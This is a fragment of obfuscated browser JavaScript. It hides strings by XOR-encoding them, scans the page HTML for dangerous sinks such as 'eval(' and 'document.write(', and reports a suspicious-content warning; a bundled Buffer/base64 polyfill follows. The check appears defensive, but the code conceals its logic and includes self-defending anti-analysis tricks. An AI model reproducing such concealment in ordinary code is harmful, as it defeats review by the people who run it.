                    const e = (o >>> g.nAYFd(t % 4, 8)) & 255;
                    i[t] = r[t] ^ e;
                  }
                  e = new TextDecoder()[n(217)](i);
                }
                return e;
              };
            })()()
          )
        )
          return (
            g.GReQE(C),
            await K(
              (function () {
                const t = 209,
                  e = 149,
                  n = m,
                  r = {};
                (r[n(d)] = function (t, e) {
                  return t < e;
                }),
                  (r.DssSp = function (t, e) {
                    return t % e;
                  });
                const o = r;
                let i;
                return function () {
                  const r = n;
                  if (!i) {
                    const n = new Uint8Array([
                        242, 230, 125, 4, 217, 237, 96, 14, 217, 190, 106, 14,
                        217, 234, 108, 25, 195, 190, 97, 0, 196, 190, 107, 4,
                        210, 240, 41, 2, 216, 243, 121, 19, 216, 243, 96, 18,
                        210, 250,
                      ]),
                      s = 1628020407,
                      a = new Uint8Array(n[r(t)]);
                    for (let t = 0; o.RpGpd(t, n.length); t++) {
                      const i = (s >>> (8 * o[r(e)](t, 4))) & 255;
                      a[t] = n[t] ^ i;
                    }
                    i = new TextDecoder()[r(217)](a);
                  }
                  return i;
                };
              })()()
            ),
            ![]
          );
        const t = [
            (function () {
              let t;
              return function () {
                const e = $;
                if (!t) {
                  const n = new Uint8Array([208, 232, 104, 13, 157]),
                    r = 1628020405,
                    o = new Uint8Array(n.length);
                  for (let t = 0; g.DmVIr(t, n[e(l)]); t++) {
                    const i = 255 & g[e(155)](r, 8 * g[e(170)](t, 4));
                    o[t] = n[t] ^ i;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            (function () {
              const t = 182;
              let e;
              return function () {
                const n = $;
                if (!e) {
                  const r = new Uint8Array([
                      237, 235, 103, 2, 223, 247, 102, 15, 131,
                    ]),
                    o = 1628020395,
                    i = new Uint8Array(r.length);
                  for (let e = 0; g[n(t)](e, r.length); e++) {
                    const t = g.bSwLy(o >>> g.nZmtT(e % 4, 8), 255);
                    i[e] = g.ZzMYI(r[e], t);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            skCrypt(g[m(142)])(),
            skCrypt(g[m(e)])(),
            (function () {
              const t = {
                HghtK: function (t, e) {
                  return g[$(c)](t, e);
                },
                HYuCs: function (t, e) {
                  return t * e;
                },
              };
              let e;
              return function () {
                const n = $;
                if (!e) {
                  const r = new Uint8Array([
                      209, 241, 106, 20, 216, 251, 103, 21, 155, 233, 123, 8,
                      193, 251, 33,
                    ]),
                    o = 1628020405,
                    c = new Uint8Array(r.length);
                  for (let e = 0; e < r[n(i)]; e++) {
                    const i = t[n(s)](o >>> t[n(a)](e % 4, 8), 255);
                    c[e] = r[e] ^ i;
                  }
                  e = new TextDecoder()[n(u)](c);
                }
                return e;
              };
            })()(),
            (function () {
              const t = 148,
                e = 217;
              let n;
              return function () {
                const r = $;
                if (!n) {
                  const o = new Uint8Array([
                      222, 240, 103, 4, 197, 214, 93, 44, 251, 190, 52,
                    ]),
                    i = 1628020407,
                    s = new Uint8Array(o.length);
                  for (let e = 0; g[r(t)](e, o[r(209)]); e++) {
                    const t = (i >>> g.nAYFd(e % 4, 8)) & 255;
                    s[e] = g.ZzMYI(o[e], t);
                  }
                  n = new TextDecoder()[r(e)](s);
                }
                return n;
              };
            })()(),
          ],
          r = document[m(n) + m(166)].outerHTML;
        for (const e of t)
          if (r.includes(e))
            return (
              C(),
              await g.DTNwp(
                W,
                (function () {
                  let t;
                  return function () {
                    if (!t) {
                      const e = new Uint8Array([
                          230, 235, 122, 17, 220, 253, 96, 14, 192, 237, 41, 2,
                          218, 250, 108, 65, 197, 255, 125, 21, 208, 236, 103,
                          65, 209, 251, 125, 4, 214, 234, 108, 5, 143, 190,
                        ]),
                        n = 1628020405,
                        r = new Uint8Array(e.length);
                      for (let t = 0; t < e.length; t++) {
                        const o = (n >>> (8 * g.pDrhQ(t, 4))) & 255;
                        r[t] = e[t] ^ o;
                      }
                      t = new TextDecoder().decode(r);
                    }
                    return t;
                  };
                })()() + e
              ),
              ![]
            );
        return !![];
      } catch (y) {
        C();
        let t = m(137) + m(r);
        return (
          g.RCcHg(y, Error)
            ? (t = y.message)
            : "string" == typeof y
            ? (t = y)
            : y && g[m(o)](typeof y, m(143)) && (t = JSON.stringify(y)),
          await K(
            (function () {
              const t = 172,
                e = 217;
              let n;
              return function () {
                const r = $;
                if (!n) {
                  const o = new Uint8Array([
                      224, 251, 106, 20, 193, 247, 125, 24, 147, 232, 104, 13,
                      218, 250, 104, 21, 218, 241, 103, 65, 213, 255, 96, 13,
                      214, 250, 51, 65,
                    ]),
                    i = 1628020403,
                    s = new Uint8Array(o.length);
                  for (let e = 0; g.AwvQy(e, o.length); e++) {
                    const n = 255 & g.XzLPz(i, 8 * g.vYYfz(e, 4));
                    s[e] = g[r(t)](o[e], n);
                  }
                  n = new TextDecoder()[r(e)](s);
                }
                return n;
              };
            })()() + t
          ),
          ![]
        );
      }
    };
  function $(t, e) {
    const n = H();
    return (
      ($ = function (e, r) {
        let o = n[(e -= 137)];
        if (void 0 === $.EFgPph) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          ($.PlzswD = i), (t = arguments), ($.EFgPph = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.JwKYtP = t),
              (this.EtccKS = [1, 0, 0]),
              (this.ymCrMU = function () {
                return "newState";
              }),
              (this.qszwjd = "\\w+ *\\(\\) *{\\w+ *"),
              (this.NskxVB = "['|\"].+['|\"];? *}");
          };
          (e.prototype.EUsJWr = function () {
            const t = new RegExp(this.qszwjd + this.NskxVB).test(
              this.ymCrMU.toString()
            )
              ? --this.EtccKS[1]
              : --this.EtccKS[0];
            return this.qhRebB(t);
          }),
            (e.prototype.qhRebB = function (t) {
              return Boolean(~t) ? this.HyaFtu(this.JwKYtP) : t;
            }),
            (e.prototype.HyaFtu = function (t) {
              for (let e = 0, n = this.EtccKS.length; e < n; e++)
                this.EtccKS.push(Math.round(Math.random())),
                  (n = this.EtccKS.length);
              return t(this.EtccKS[0]);
            }),
            new e($).EUsJWr(),
            (o = $.PlzswD(o)),
            (t[s] = o);
        }
        return o;
      }),
      $(t, e)
    );
  }
  axiomVamp,
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  for (
    var tt = {},
      et = {
        byteLength: function (t) {
          var e = at(t),
            n = e[0],
            r = e[1];
          return (3 * (n + r)) / 4 - r;
        },
        toByteArray: function (t) {
          var e,
            n,
            r = at(t),
            o = r[0],
            i = r[1],
            s = new ot(
              (function (t, e, n) {
                return (3 * (e + n)) / 4 - n;
              })(0, o, i)
            ),
            a = 0,
            u = i > 0 ? o - 4 : o;
          for (n = 0; n < u; n += 4)
            (e =
              (rt[t.charCodeAt(n)] << 18) |
              (rt[t.charCodeAt(n + 1)] << 12) |
              (rt[t.charCodeAt(n + 2)] << 6) |
              rt[t.charCodeAt(n + 3)]),
              (s[a++] = (e >> 16) & 255),
              (s[a++] = (e >> 8) & 255),
              (s[a++] = 255 & e);
          2 === i &&
            ((e = (rt[t.charCodeAt(n)] << 2) | (rt[t.charCodeAt(n + 1)] >> 4)),
            (s[a++] = 255 & e));
          1 === i &&
            ((e =
              (rt[t.charCodeAt(n)] << 10) |
              (rt[t.charCodeAt(n + 1)] << 4) |
              (rt[t.charCodeAt(n + 2)] >> 2)),
            (s[a++] = (e >> 8) & 255),
            (s[a++] = 255 & e));
          return s;
        },
        fromByteArray: function (t) {
          for (
            var e, n = t.length, r = n % 3, o = [], i = 16383, s = 0, a = n - r;
            s < a;
            s += i
          )
            o.push(ct(t, s, s + i > a ? a : s + i));
          1 === r
            ? ((e = t[n - 1]), o.push(nt[e >> 2] + nt[(e << 4) & 63] + "=="))
            : 2 === r &&
              ((e = (t[n - 2] << 8) + t[n - 1]),
              o.push(
                nt[e >> 10] + nt[(e >> 4) & 63] + nt[(e << 2) & 63] + "="
              ));
          return o.join("");
        },
      },
      nt = [],
      rt = [],
      ot = "undefined" != typeof Uint8Array ? Uint8Array : Array,
      it = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
      st = 0;
    st < 64;
    ++st
  )
    (nt[st] = it[st]), (rt[it.charCodeAt(st)] = st);
  function at(t) {
    var e = t.length;
    if (e % 4 > 0)
      throw new Error("Invalid string. Length must be a multiple of 4");
    var n = t.indexOf("=");
    return -1 === n && (n = e), [n, n === e ? 0 : 4 - (n % 4)];
  }
  function ut(t) {
    return (
      nt[(t >> 18) & 63] + nt[(t >> 12) & 63] + nt[(t >> 6) & 63] + nt[63 & t]
    );
  }
  function ct(t, e, n) {
    for (var r, o = [], i = e; i < n; i += 3)
      (r =
        ((t[i] << 16) & 16711680) +
        ((t[i + 1] << 8) & 65280) +
        (255 & t[i + 2])),
        o.push(ut(r));
    return o.join("");
  }
  (rt["-".charCodeAt(0)] = 62), (rt["_".charCodeAt(0)] = 63);
  var lt = {
    read: function (t, e, n, r, o) {
      var i,
        s,
        a = 8 * o - r - 1,
        u = (1 << a) - 1,
        c = u >> 1,
        l = -7,
        d = n ? o - 1 : 0,
        f = n ? -1 : 1,
        h = t[e + d];
      for (
        d += f, i = h & ((1 << -l) - 1), h >>= -l, l += a;
        l > 0;
        i = 256 * i + t[e + d], d += f, l -= 8
      );
      for (
        s = i & ((1 << -l) - 1), i >>= -l, l += r;
        l > 0;
        s = 256 * s + t[e + d], d += f, l -= 8
      );
      if (0 === i) i = 1 - c;
      else {
        if (i === u) return s ? NaN : (1 / 0) * (h ? -1 : 1);
        (s += Math.pow(2, r)), (i -= c);
      }
      return (h ? -1 : 1) * s * Math.pow(2, i - r);
    },
    write: function (t, e, n, r, o, i) {
      var s,
        a,
        u,
        c = 8 * i - o - 1,
        l = (1 << c) - 1,
        d = l >> 1,
        f = 23 === o ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
        h = r ? 0 : i - 1,
        p = r ? 1 : -1,
        m = e < 0 || (0 === e && 1 / e < 0) ? 1 : 0;
      for (
        e = Math.abs(e),
          isNaN(e) || e === 1 / 0
            ? ((a = isNaN(e) ? 1 : 0), (s = l))
            : ((s = Math.floor(Math.log(e) / Math.LN2)),
              e * (u = Math.pow(2, -s)) < 1 && (s--, (u *= 2)),
              (e += s + d >= 1 ? f / u : f * Math.pow(2, 1 - d)) * u >= 2 &&
                (s++, (u /= 2)),
              s + d >= l
                ? ((a = 0), (s = l))
                : s + d >= 1
                ? ((a = (e * u - 1) * Math.pow(2, o)), (s += d))
                : ((a = e * Math.pow(2, d - 1) * Math.pow(2, o)), (s = 0)));
        o >= 8;
        t[n + h] = 255 & a, h += p, a /= 256, o -= 8
      );
      for (
        s = (s << o) | a, c += o;
        c > 0;
        t[n + h] = 255 & s, h += p, s /= 256, c -= 8
      );
      t[n + h - p] |= 128 * m;
    },
  };
  !(function (t) {
    const e = et,
      n = lt,
      r =
        "function" == typeof Symbol && "function" == typeof Symbol.for
          ? Symbol.for("nodejs.util.inspect.custom")
          : null;
    (t.Buffer = c),
      (t.SlowBuffer = function (t) {
        +t != t && (t = 0);
        return c.alloc(+t);
      }),
      (t.INSPECT_MAX_BYTES = 50);
    const o = 2147483647;
    t.kMaxLength = o;
    const { Uint8Array: i, ArrayBuffer: s, SharedArrayBuffer: a } = globalThis;
    function u(t) {
      if (t > o)
        throw new RangeError(
          'The value "' + t + '" is invalid for option "size"'
        );
      const e = new i(t);
      return Object.setPrototypeOf(e, c.prototype), e;
    }
    function c(t, e, n) {
      if ("number" == typeof t) {
        if ("string" == typeof e)
          throw new TypeError(
            'The "string" argument must be of type string. Received type number'
          );
        return f(t);
      }
      return l(t, e, n);
    }
    function l(t, e, n) {
      if ("string" == typeof t)
        return (function (t, e) {
          ("string" == typeof e && "" !== e) || (e = "utf8");
          if (!c.isEncoding(e)) throw new TypeError("Unknown encoding: " + e);
          const n = 0 | g(t, e);
          let r = u(n);
          const o = r.write(t, e);
          o !== n && (r = r.slice(0, o));
          return r;
        })(t, e);
      if (s.isView(t))
        return (function (t) {
          if (J(t, i)) {
            const e = new i(t);
            return p(e.buffer, e.byteOffset, e.byteLength);
          }
          return h(t);
        })(t);
      if (null == t)
        throw new TypeError(
          "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
            typeof t
        );
      if (J(t, s) || (t && J(t.buffer, s))) return p(t, e, n);
      if (void 0 !== a && (J(t, a) || (t && J(t.buffer, a)))) return p(t, e, n);
      if ("number" == typeof t)
        throw new TypeError(
          'The "value" argument must not be of type number. Received type number'
        );
      const r = t.valueOf && t.valueOf();
      if (null != r && r !== t) return c.from(r, e, n);
      const o = (function (t) {
        if (c.isBuffer(t)) {
          const e = 0 | m(t.length),
            n = u(e);
          return 0 === n.length || t.copy(n, 0, 0, e), n;
        }
        if (void 0 !== t.length)
          return "number" != typeof t.length || Y(t.length) ? u(0) : h(t);
        if ("Buffer" === t.type && Array.isArray(t.data)) return h(t.data);
      })(t);
      if (o) return o;
      if (
        "undefined" != typeof Symbol &&
        null != Symbol.toPrimitive &&
        "function" == typeof t[Symbol.toPrimitive]
      )
        return c.from(t[Symbol.toPrimitive]("string"), e, n);
      throw new TypeError(
        "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
          typeof t
      );
    }
    function d(t) {
      if ("number" != typeof t)
        throw new TypeError('"size" argument must be of type number');
      if (t < 0)
        throw new RangeError(
          'The value "' + t + '" is invalid for option "size"'
        );
    }
    function f(t) {
      return d(t), u(t < 0 ? 0 : 0 | m(t));
    }
    function h(t) {
      const e = t.length < 0 ? 0 : 0 | m(t.length),
        n = u(e);
      for (let r = 0; r < e; r += 1) n[r] = 255 & t[r];
      return n;
    }
    function p(t, e, n) {
      if (e < 0 || t.byteLength < e)
        throw new RangeError('"offset" is outside of buffer bounds');
      if (t.byteLength < e + (n || 0))
        throw new RangeError('"length" is outside of buffer bounds');
      let r;
      return (
        (r =
          void 0 === e && void 0 === n
            ? new i(t)
            : void 0 === n
            ? new i(t, e)
            : new i(t, e, n)),
        Object.setPrototypeOf(r, c.prototype),
        r
      );
    }
    function m(t) {
      if (t >= o)
        throw new RangeError(
          "Attempt to allocate Buffer larger than maximum size: 0x" +
            o.toString(16) +
            " bytes"
        );
      return 0 | t;
    }
    function g(t, e) {
      if (c.isBuffer(t)) return t.length;
      if (s.isView(t) || J(t, s)) return t.byteLength;
      if ("string" != typeof t)
        throw new TypeError(
          'The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' +
            typeof t
        );
      const n = t.length,
        r = arguments.length > 2 && !0 === arguments[2];
      if (!r && 0 === n) return 0;
      let o = !1;
      for (;;)
        switch (e) {
          case "ascii":
          case "latin1":
          case "binary":
            return n;
          case "utf8":
          case "utf-8":
            return H(t).length;
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return 2 * n;
          case "hex":
            return n >>> 1;
          case "base64":
            return Z(t).length;
          default:
            if (o) return r ? -1 : H(t).length;
            (e = ("" + e).toLowerCase()), (o = !0);
        }
    }
    function y(t, e, n) {
      let r = !1;
      if (((void 0 === e || e < 0) && (e = 0), e > this.length)) return "";
      if (((void 0 === n || n > this.length) && (n = this.length), n <= 0))
        return "";
      if ((n >>>= 0) <= (e >>>= 0)) return "";
      for (t || (t = "utf8"); ; )
        switch (t) {
          case "hex":
            return P(this, e, n);
          case "utf8":
          case "utf-8":
            return B(this, e, n);
          case "ascii":
            return E(this, e, n);
          case "latin1":
          case "binary":
            return x(this, e, n);
          case "base64":
            return T(this, e, n);
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return O(this, e, n);
          default:
            if (r) throw new TypeError("Unknown encoding: " + t);
            (t = (t + "").toLowerCase()), (r = !0);
        }
    }
    function w(t, e, n) {
      const r = t[e];
      (t[e] = t[n]), (t[n] = r);
    }
    function b(t, e, n, r, o) {
      if (0 === t.length) return -1;
      if (
        ("string" == typeof n
          ? ((r = n), (n = 0))
          : n > 2147483647
          ? (n = 2147483647)
          : n < -2147483648 && (n = -2147483648),
        Y((n = +n)) && (n = o ? 0 : t.length - 1),
        n < 0 && (n = t.length + n),
        n >= t.length)
      ) {
        if (o) return -1;
        n = t.length - 1;
      } else if (n < 0) {
        if (!o) return -1;
        n = 0;
      }
      if (("string" == typeof e && (e = c.from(e, r)), c.isBuffer(e)))
        return 0 === e.length ? -1 : v(t, e, n, r, o);
      if ("number" == typeof e)
        return (
          (e &= 255),
          "function" == typeof i.prototype.indexOf
            ? o
              ? i.prototype.indexOf.call(t, e, n)
              : i.prototype.lastIndexOf.call(t, e, n)
            : v(t, [e], n, r, o)
        );
      throw new TypeError("val must be string, number or Buffer");
    }
    function v(t, e, n, r, o) {
      let i,
        s = 1,
        a = t.length,
        u = e.length;
      if (
        void 0 !== r &&
        ("ucs2" === (r = String(r).toLowerCase()) ||
          "ucs-2" === r ||
          "utf16le" === r ||
          "utf-16le" === r)
      ) {
        if (t.length < 2 || e.length < 2) return -1;
        (s = 2), (a /= 2), (u /= 2), (n /= 2);
      }
      function c(t, e) {
        return 1 === s ? t[e] : t.readUInt16BE(e * s);
      }
      if (o) {
        let r = -1;
        for (i = n; i < a; i++)
          if (c(t, i) === c(e, -1 === r ? 0 : i - r)) {
            if ((-1 === r && (r = i), i - r + 1 === u)) return r * s;
          } else -1 !== r && (i -= i - r), (r = -1);
      } else
        for (n + u > a && (n = a - u), i = n; i >= 0; i--) {
          let n = !0;
          for (let r = 0; r < u; r++)
            if (c(t, i + r) !== c(e, r)) {
              n = !1;
              break;
            }
          if (n) return i;
        }
      return -1;
    }
    function A(t, e, n, r) {
      n = Number(n) || 0;
      const o = t.length - n;
      r ? (r = Number(r)) > o && (r = o) : (r = o);
      const i = e.length;
      let s;
      for (r > i / 2 && (r = i / 2), s = 0; s < r; ++s) {
        const r = parseInt(e.substr(2 * s, 2), 16);
        if (Y(r)) return s;
        t[n + s] = r;
      }
      return s;
    }
    function k(t, e, n, r) {
      return X(H(e, t.length - n), t, n, r);
    }
    function I(t, e, n, r) {
      return X(
        (function (t) {
          const e = [];
          for (let n = 0; n < t.length; ++n) e.push(255 & t.charCodeAt(n));
          return e;
        })(e),
        t,
        n,
        r
      );
    }
    function S(t, e, n, r) {
      return X(Z(e), t, n, r);
    }
    function _(t, e, n, r) {
      return X(
        (function (t, e) {
          let n, r, o;
          const i = [];
          for (let s = 0; s < t.length && !((e -= 2) < 0); ++s)
            (n = t.charCodeAt(s)),
              (r = n >> 8),
              (o = n % 256),
              i.push(o),
              i.push(r);
          return i;
        })(e, t.length - n),
        t,
        n,
        r
      );
    }
    function T(t, n, r) {
      return 0 === n && r === t.length
        ? e.fromByteArray(t)
        : e.fromByteArray(t.slice(n, r));
    }
    function B(t, e, n) {
      n = Math.min(t.length, n);
      const r = [];
      let o = e;
      for (; o < n; ) {
        const e = t[o];
        let i = null,
          s = e > 239 ? 4 : e > 223 ? 3 : e > 191 ? 2 : 1;
        if (o + s <= n) {
          let n, r, a, u;
          switch (s) {
            case 1:
              e < 128 && (i = e);
              break;
            case 2:
              (n = t[o + 1]),
                128 == (192 & n) &&
                  ((u = ((31 & e) << 6) | (63 & n)), u > 127 && (i = u));
              break;
            case 3:
              (n = t[o + 1]),
                (r = t[o + 2]),
                128 == (192 & n) &&
                  128 == (192 & r) &&
                  ((u = ((15 & e) << 12) | ((63 & n) << 6) | (63 & r)),
                  u > 2047 && (u < 55296 || u > 57343) && (i = u));
              break;
            case 4:
              (n = t[o + 1]),
                (r = t[o + 2]),
                (a = t[o + 3]),
                128 == (192 & n) &&
                  128 == (192 & r) &&
                  128 == (192 & a) &&
                  ((u =
                    ((15 & e) << 18) |
                    ((63 & n) << 12) |
                    ((63 & r) << 6) |
                    (63 & a)),
                  u > 65535 && u < 1114112 && (i = u));
          }
        }
        null === i
          ? ((i = 65533), (s = 1))
          : i > 65535 &&
            ((i -= 65536),
            r.push(((i >>> 10) & 1023) | 55296),
            (i = 56320 | (1023 & i))),
          r.push(i),
          (o += s);
      }
      return (function (t) {
        const e = t.length;
        if (e <= C) return String.fromCharCode.apply(String, t);
        let n = "",
          r = 0;
        for (; r < e; )
          n += String.fromCharCode.apply(String, t.slice(r, (r += C)));
        return n;
      })(r);
    }
    (c.TYPED_ARRAY_SUPPORT = (function () {
      try {
        const t = new i(1),
          e = {
            foo: function () {
              return 42;
            },
          };
        return (
          Object.setPrototypeOf(e, i.prototype),
          Object.setPrototypeOf(t, e),
          42 === t.foo()
        );
      } catch (t) {
        return !1;
      }
    })()),
      c.TYPED_ARRAY_SUPPORT || "undefined" == typeof console || console.error,
      Object.defineProperty(c.prototype, "parent", {
        enumerable: !0,
        get: function () {
          if (c.isBuffer(this)) return this.buffer;
        },
      }),
      Object.defineProperty(c.prototype, "offset", {
        enumerable: !0,
        get: function () {
          if (c.isBuffer(this)) return this.byteOffset;
        },
      }),
      (c.poolSize = 8192),
      (c.from = function (t, e, n) {
        return l(t, e, n);
      }),
      Object.setPrototypeOf(c.prototype, i.prototype),
      Object.setPrototypeOf(c, i),
      (c.alloc = function (t, e, n) {
        return (function (t, e, n) {
          return (
            d(t),
            t <= 0
              ? u(t)
              : void 0 !== e
              ? "string" == typeof n
                ? u(t).fill(e, n)
                : u(t).fill(e)
              : u(t)
          );
        })(t, e, n);
      }),
      (c.allocUnsafe = function (t) {
        return f(t);
      }),
      (c.allocUnsafeSlow = function (t) {
        return f(t);
      }),
      (c.isBuffer = function (t) {
        return null != t && !0 === t._isBuffer && t !== c.prototype;
      }),
      (c.compare = function (t, e) {
        if (
          (J(t, i) && (t = c.from(t, t.offset, t.byteLength)),
          J(e, i) && (e = c.from(e, e.offset, e.byteLength)),
          !c.isBuffer(t) || !c.isBuffer(e))
        )
          throw new TypeError(
            'The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array'
          );
        if (t === e) return 0;
        let n = t.length,
          r = e.length;
        for (let o = 0, i = Math.min(n, r); o < i; ++o)
          if (t[o] !== e[o]) {
            (n = t[o]), (r = e[o]);
            break;
          }
        return n < r ? -1 : r < n ? 1 : 0;
      }),
      (c.isEncoding = function (t) {
        switch (String(t).toLowerCase()) {
          case "hex":
          case "utf8":
          case "utf-8":
          case "ascii":
          case "latin1":
          case "binary":
          case "base64":
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return !0;
          default:
            return !1;
        }
      }),
      (c.concat = function (t, e) {
        if (!Array.isArray(t))
          throw new TypeError('"list" argument must be an Array of Buffers');
        if (0 === t.length) return c.alloc(0);
        let n;
        if (void 0 === e)
          for (e = 0, n = 0; n < t.length; ++n) e += t[n].length;
        const r = c.allocUnsafe(e);
        let o = 0;
        for (n = 0; n < t.length; ++n) {
          let e = t[n];
          if (J(e, i))
            o + e.length > r.length
              ? (c.isBuffer(e) || (e = c.from(e)), e.copy(r, o))
              : i.prototype.set.call(r, e, o);
          else {
            if (!c.isBuffer(e))
              throw new TypeError(
                '"list" argument must be an Array of Buffers'
              );
            e.copy(r, o);
          }
          o += e.length;
        }
        return r;
      }),
      (c.byteLength = g),
      (c.prototype._isBuffer = !0),
      (c.prototype.swap16 = function () {
        const t = this.length;
        if (t % 2 != 0)
          throw new RangeError("Buffer size must be a multiple of 16-bits");
        for (let e = 0; e < t; e += 2) w(this, e, e + 1);
        return this;
      }),
      (c.prototype.swap32 = function () {
        const t = this.length;
        if (t % 4 != 0)
          throw new RangeError("Buffer size must be a multiple of 32-bits");
        for (let e = 0; e < t; e += 4) w(this, e, e + 3), w(this, e + 1, e + 2);
        return this;
      }),
      (c.prototype.swap64 = function () {
        const t = this.length;
        if (t % 8 != 0)
          throw new RangeError("Buffer size must be a multiple of 64-bits");
        for (let e = 0; e < t; e += 8)
          w(this, e, e + 7),
            w(this, e + 1, e + 6),
            w(this, e + 2, e + 5),
            w(this, e + 3, e + 4);
        return this;
      }),
      (c.prototype.toString = function () {
        const t = this.length;
        return 0 === t
          ? ""
          : 0 === arguments.length
          ? B(this, 0, t)
          : y.apply(this, arguments);
      }),
      (c.prototype.toLocaleString = c.prototype.toString),
      (c.prototype.equals = function (t) {
        if (!c.isBuffer(t)) throw new TypeError("Argument must be a Buffer");
        return this === t || 0 === c.compare(this, t);
      }),
      (c.prototype.inspect = function () {
        let e = "";
        const n = t.INSPECT_MAX_BYTES;
        return (
          (e = this.toString("hex", 0, n)
            .replace(/(.{2})/g, "$1 ")
            .trim()),
          this.length > n && (e += " ... "),
          "<Buffer " + e + ">"
        );
      }),
      r && (c.prototype[r] = c.prototype.inspect),
      (c.prototype.compare = function (t, e, n, r, o) {
        if (
          (J(t, i) && (t = c.from(t, t.offset, t.byteLength)), !c.isBuffer(t))
        )
          throw new TypeError(
            'The "target" argument must be one of type Buffer or Uint8Array. Received type ' +
              typeof t
          );
        if (
          (void 0 === e && (e = 0),
          void 0 === n && (n = t ? t.length : 0),
          void 0 === r && (r = 0),
          void 0 === o && (o = this.length),
          e < 0 || n > t.length || r < 0 || o > this.length)
        )
          throw new RangeError("out of range index");
        if (r >= o && e >= n) return 0;
        if (r >= o) return -1;
        if (e >= n) return 1;
        if (this === t) return 0;
        let s = (o >>>= 0) - (r >>>= 0),
          a = (n >>>= 0) - (e >>>= 0);
        const u = Math.min(s, a),
          l = this.slice(r, o),
          d = t.slice(e, n);
        for (let i = 0; i < u; ++i)
          if (l[i] !== d[i]) {
            (s = l[i]), (a = d[i]);
            break;
          }
        return s < a ? -1 : a < s ? 1 : 0;
      }),
      (c.prototype.includes = function (t, e, n) {
        return -1 !== this.indexOf(t, e, n);
      }),
      (c.prototype.indexOf = function (t, e, n) {
        return b(this, t, e, n, !0);
      }),
      (c.prototype.lastIndexOf = function (t, e, n) {
        return b(this, t, e, n, !1);
      }),
      (c.prototype.write = function (t, e, n, r) {
        if (void 0 === e) (r = "utf8"), (n = this.length), (e = 0);
        else if (void 0 === n && "string" == typeof e)
          (r = e), (n = this.length), (e = 0);
        else {
          if (!isFinite(e))
            throw new Error(
              "Buffer.write(string, encoding, offset[, length]) is no longer supported"
            );
          (e >>>= 0),
            isFinite(n)
              ? ((n >>>= 0), void 0 === r && (r = "utf8"))
              : ((r = n), (n = void 0));
        }
        const o = this.length - e;
        if (
          ((void 0 === n || n > o) && (n = o),
          (t.length > 0 && (n < 0 || e < 0)) || e > this.length)
        )
          throw new RangeError("Attempt to write outside buffer bounds");
        r || (r = "utf8");
        let i = !1;
        for (;;)
          switch (r) {
            case "hex":
              return A(this, t, e, n);
            case "utf8":
            case "utf-8":
              return k(this, t, e, n);
            case "ascii":
            case "latin1":
            case "binary":
              return I(this, t, e, n);
            case "base64":
              return S(this, t, e, n);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return _(this, t, e, n);
            default:
              if (i) throw new TypeError("Unknown encoding: " + r);
              (r = ("" + r).toLowerCase()), (i = !0);
          }
      }),
      (c.prototype.toJSON = function () {
        return {
          type: "Buffer",
          data: Array.prototype.slice.call(this._arr || this, 0),
        };
      });
    const C = 4096;
    function E(t, e, n) {
      let r = "";
      n = Math.min(t.length, n);
      for (let o = e; o < n; ++o) r += String.fromCharCode(127 & t[o]);
      return r;
    }
    function x(t, e, n) {
      let r = "";
      n = Math.min(t.length, n);
      for (let o = e; o < n; ++o) r += String.fromCharCode(t[o]);
      return r;
    }
    function P(t, e, n) {
      const r = t.length;
      (!e || e < 0) && (e = 0), (!n || n < 0 || n > r) && (n = r);
      let o = "";
      for (let i = e; i < n; ++i) o += Q[t[i]];
      return o;
    }
    function O(t, e, n) {
      const r = t.slice(e, n);
      let o = "";
      for (let i = 0; i < r.length - 1; i += 2)
        o += String.fromCharCode(r[i] + 256 * r[i + 1]);
      return o;
    }
    function R(t, e, n) {
      if (t % 1 != 0 || t < 0) throw new RangeError("offset is not uint");
      if (t + e > n)
        throw new RangeError("Trying to access beyond buffer length");
    }
    function M(t, e, n, r, o, i) {
      if (!c.isBuffer(t))
        throw new TypeError('"buffer" argument must be a Buffer instance');
      if (e > o || e < i)
        throw new RangeError('"value" argument is out of bounds');
      if (n + r > t.length) throw new RangeError("Index out of range");
    }
    function L(t, e, n, r, o) {
      F(e, r, o, t, n, 7);
      let i = Number(e & BigInt(4294967295));
      (t[n++] = i),
        (i >>= 8),
        (t[n++] = i),
        (i >>= 8),
        (t[n++] = i),
        (i >>= 8),
        (t[n++] = i);
      let s = Number((e >> BigInt(32)) & BigInt(4294967295));
      return (
        (t[n++] = s),
        (s >>= 8),
        (t[n++] = s),
        (s >>= 8),
        (t[n++] = s),
        (s >>= 8),
        (t[n++] = s),
        n
      );
    }
    function N(t, e, n, r, o) {
      F(e, r, o, t, n, 7);
      let i = Number(e & BigInt(4294967295));
      (t[n + 7] = i),
        (i >>= 8),
        (t[n + 6] = i),
        (i >>= 8),
        (t[n + 5] = i),
        (i >>= 8),
        (t[n + 4] = i);
      let s = Number((e >> BigInt(32)) & BigInt(4294967295));
      return (
        (t[n + 3] = s),
        (s >>= 8),
        (t[n + 2] = s),
        (s >>= 8),
        (t[n + 1] = s),
        (s >>= 8),
        (t[n] = s),
        n + 8
      );
    }
